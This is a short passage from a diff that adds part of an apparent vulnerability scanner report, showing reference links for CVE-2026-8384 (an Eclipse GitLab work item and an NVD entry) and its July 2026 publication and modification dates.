+                               │                  ├ [8]: https://gitlab.eclipse.org/security/cve-assignment/-/w
+                               │                  │      ork_items/108 
+                               │                  ╰ [9]: https://nvd.nist.gov/vuln/detail/CVE-2026-8384 
+                               ├ PublishedDate   : 2026-07-14T09:16:42.05Z 
+                               ╰ LastModifiedDate: 2026-07-14T18:39:51.587Z 
 ```
